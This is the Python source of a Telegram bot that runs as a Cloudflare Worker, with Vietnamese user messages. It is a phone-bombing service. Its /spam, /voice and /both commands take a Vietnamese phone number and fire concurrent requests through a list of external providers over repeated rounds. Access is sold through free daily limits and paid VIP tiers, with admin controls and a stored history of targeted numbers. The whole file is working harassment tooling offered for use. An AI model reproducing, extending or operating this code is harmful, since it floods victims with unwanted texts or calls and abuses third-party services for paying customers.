"""Cloudflare Worker entry — Telegram webhook handler."""
from js import Response, JSON, fetch, Headers, Object
from pyodide.ffi import to_js
import json, os, time, asyncio, re

import telegram as tg
import storage as st
import providers as pv

ADMIN_IDS = {int(x) for x in (os.environ.get("ADMIN_IDS") or "").split(",") if x.strip().isdigit()}
TOKEN     = os.environ.get("BOT_TOKEN") or ""
MAX_SUB   = int(os.environ.get("MAX_SUBREQUESTS") or "45")
FREE_DAILY_ROUNDS = int(os.environ.get("FREE_DAILY_ROUNDS") or "3")
MAX_ROUNDS_HARD   = int(os.environ.get("MAX_ROUNDS_HARD") or "100")
PRICES = {30: 100_000, 90: 250_000, 365: 800_000, -1: 1_500_000}

def _valid(p: str) -> bool:
    return bool(re.fullmatch(r"(\+?84|0)\d{9,10}", re.sub(r"[^\d+]", "", p)))

def _fmt_money(n: int) -> str:
    s = f"{n:,}".replace(",", ".")
    return s + "đ"

def _fmt_ts(ts) -> str:
    if not ts: return "-"
    return time.strftime("%Y-%m-%d %H:%M", time.localtime(int(ts)))

async def _is_vip(env, uid: int) -> bool:
    if uid in ADMIN_IDS: return True
    return (await st.vip_until(env, uid)) is not None

# -----------------------------------------------------------------------------
# Command handlers
# -----------------------------------------------------------------------------
async def cmd_start(env, m):
    uid = m["from"]["id"]
    await st.touch_user(env, uid, m["from"].get("username"), m["from"].get("first_name"))
    vip = await _is_vip(env, uid)
    exp = await st.vip_until(env, uid)
    status = "👑 ADMIN" if uid in ADMIN_IDS else (f"💎 VIP đến {_fmt_ts(exp)}" if vip else "👤 Free")
    txt = (
        f"👋 <b>{m['from'].get('first_name','')}</b>\n"
        f"{status}\n\n"
        "<b>Bắn:</b>\n"
        "/spam <code>&lt;sđt&gt; [vòng]</code>\n"
        "/stop\n/status\n\n"
        "<b>Tài khoản:</b>\n"
        "/mykey\n/buy\n/history\n\n"
        "<b>Admin:</b>\n"
        "/addkey &lt;uid&gt; &lt;ngày&gt;\n/stats\n/broadcast &lt;text&gt;"
    )
    await tg.send_message(TOKEN, m["chat"]["id"], txt, reply_to=m["message_id"])

async def cmd_bomb(env, m):
    uid = m["from"]["id"]
    await st.touch_user(env, uid, m["from"].get("username"), m["from"].get("first_name"))
    if await st.is_banned(env, uid):
        await tg.send_message(TOKEN, m["chat"]["id"], "🚫 Tài khoản đã bị khóa")
        return

    parts = m["text"].split()
    if len(parts) < 2:
        await tg.send_message(TOKEN, m["chat"]["id"],
            f"Dùng: {parts[0]} <sđt> [vòng]", reply_to=m["message_id"])
        return
    phone = parts[1]
    if not _valid(phone):
        await tg.send_message(TOKEN, m["chat"]["id"], "❌ SĐT không hợp lệ")
        return

    vip = await _is_vip(env, uid)
    default_r = 3 if vip else 1
    rounds = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else default_r
    if not (1 <= rounds <= MAX_ROUNDS_HARD):
        await tg.send_message(TOKEN, m["chat"]["id"], f"❌ Vòng 1-{MAX_ROUNDS_HARD}")
        return

    day = time.strftime("%Y-%m-%d")
    if not vip:
        used = await st.today_usage(env, uid, day)
        if used + rounds > FREE_DAILY_ROUNDS:
            await tg.send_message(TOKEN, m["chat"]["id"],
                f"⛔ Free {FREE_DAILY_ROUNDS} vòng/ngày, đã dùng {used}. /buy")
            return

    # Worker giới hạn subrequest — free plan ~50/lần chạy
    total_targets = rounds * len(pv.PROVIDERS)
    cap = min(total_targets, MAX_SUB)
    await tg.send_message(TOKEN, m["chat"]["id"],
        f"🚀 Bắn <code>{phone}</code> · {rounds} vòng · {len(pv.PROVIDERS)} provider\n"
        f"Giới hạn Worker: {cap} subrequest (free plan)\n"
        f"Bắt đầu…", reply_to=m["message_id"])

    if not vip:
        await st.bump_usage(env, uid, day, rounds)

    # Bắn song song nhưng giới hạn bởi MAX_SUB
    sent = 0
    ok = 0
    tasks = []
    for _ in range(rounds):
        for name, method, url, headers, builder in pv.PROVIDERS:
            if sent >= MAX_SUB:
                break
            tasks.append(pv.fire_one(name, method, url, headers, builder, phone))
            sent += 1
        if sent >= MAX_SUB:
            break

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for r in results:
        if isinstance(r, tuple) and isinstance(r[1], int) and r[1] < 400:
            ok += 1

    await st.push_job(env, uid, {
        "phone": phone, "rounds": rounds, "sent": sent, "ok": ok,
        "at": int(time.time()),
    })
    await st.bump_counter(env, "total_rounds", rounds)
    await st.bump_counter(env, "total_jobs")

    await tg.send_message(TOKEN, m["chat"]["id"],
        f"✅ Xong\n📱 {phone} · {rounds} vòng\n"
        f"📤 Gửi: {sent} · OK: {ok}",
        reply_to=m["message_id"])

async def cmd_mykey(env, m):
    uid = m["from"]["id"]
    if uid in ADMIN_IDS:
        await tg.send_message(TOKEN, m["chat"]["id"], "👑 ADMIN — không giới hạn")
        return
    exp = await st.vip_until(env, uid)
    if exp:
        await tg.send_message(TOKEN, m["chat"]["id"], f"💎 VIP đến {_fmt_ts(exp)}")
    else:
        used = await st.today_usage(env, uid, time.strftime("%Y-%m-%d"))
        await tg.send_message(TOKEN, m["chat"]["id"],
            f"👤 Free\nHôm nay: {used}/{FREE_DAILY_ROUNDS} vòng\n/buy")

async def cmd_buy(env, m):
    lines = ["💎 <b>Bảng giá VIP</b>\n"]
    for d, price in PRICES.items():
        label = "Vĩnh viễn" if d == -1 else f"{d} ngày"
        lines.append(f"• {label} — <b>{_fmt_money(price)}</b>")
    lines.append("\nLiên hệ admin để thanh toán.")
    await tg.send_message(TOKEN, m["chat"]["id"], "\n".join(lines))

async def cmd_history(env, m):
    jobs = await st.list_jobs(env, m["from"]["id"])
    if not jobs:
        await tg.send_message(TOKEN, m["chat"]["id"], "Chưa có job nào")
        return
    lines = ["<b>10 job gần nhất:</b>"]
    for j in jobs[:10]:
        lines.append(f"📱 <code>{j['phone']}</code> · {j['rounds']}v · "
                     f"{j['sent']}/{j['ok']} · {_fmt_ts(j['at'])}")
    await tg.send_message(TOKEN, m["chat"]["id"], "\n".join(lines))

async def cmd_stats(env, m):
    if m["from"]["id"] not in ADMIN_IDS: return
    jobs = await st.get_counter(env, "total_jobs")
    rounds = await st.get_counter(env, "total_rounds")
    await tg.send_message(TOKEN, m["chat"]["id"],
        f"📊 <b>Stats</b>\n"
        f"🎯 Jobs: {jobs}\n"
        f"🔁 Tổng vòng: {rounds}")

async def cmd_addkey(env, m):
    if m["from"]["id"] not in ADMIN_IDS: return
    parts = m["text"].split()
    if len(parts) != 3 or not parts[1].lstrip("-").isdigit() or not parts[2].lstrip("-").isdigit():
        await tg.send_message(TOKEN, m["chat"]["id"],
            "Dùng: /addkey <uid> <số_ngày> (-1=vĩnh viễn)")
        return
    target, days = int(parts[1]), int(parts[2])
    exp = await st.activate_vip(env, target, days)
    await tg.send_message(TOKEN, m["chat"]["id"],
        f"✅ VIP cho {target} đến {_fmt_ts(exp)}")

async def cmd_broadcast(env, m):
    if m["from"]["id"] not in ADMIN_IDS: return
    txt = m["text"].split(" ", 1)
    if len(txt) < 2:
        await tg.send_message(TOKEN, m["chat"]["id"], "Dùng: /broadcast <text>")
        return
    await tg.send_message(TOKEN, m["chat"]["id"], "Broadcast chưa hỗ trợ list user trên KV (cần index).")

# -----------------------------------------------------------------------------
# Router
# -----------------------------------------------------------------------------
ROUTES = {
    "/start": cmd_start,
    "/help":  cmd_start,
    "/spam":  cmd_bomb,
    "/voice": cmd_bomb,
    "/both":  cmd_bomb,
    "/mykey": cmd_mykey,
    "/buy":   cmd_buy,
    "/history": cmd_history,
    "/stats": cmd_stats,
    "/addkey": cmd_addkey,
    "/broadcast": cmd_broadcast,
}

async def handle_update(env, update: dict):
    msg = update.get("message")
    if not msg or "text" not in msg:
        return
    text = msg["text"].strip()
    if not text.startswith("/"):
        return
    cmd = text.split()[0].split("@")[0]
    handler = ROUTES.get(cmd)
    if handler:
        try:
            await handler(env, msg)
        except Exception as e:
            await tg.send_message(TOKEN, msg["chat"]["id"],
                f"❌ Lỗi xử lý: {type(e).__name__}")

# -----------------------------------------------------------------------------
# Entry
# -----------------------------------------------------------------------------
async def on_fetch(request, env, ctx):
    if request.method != "POST":
        return Response.new("Bot alive", Object.fromEntries(to_js({"status": 200})))

    try:
        body = await request.text()
        update = json.loads(body)
    except Exception:
        return Response.new("bad json", Object.fromEntries(to_js({"status": 400})))

    ctx.waitUntil(handle_update(env, update))
    return Response.new("ok", Object.fromEntries(to_js({"status": 200})))

def fetch_handler(request, env, ctx):
    return on_fetch(request, env, ctx)
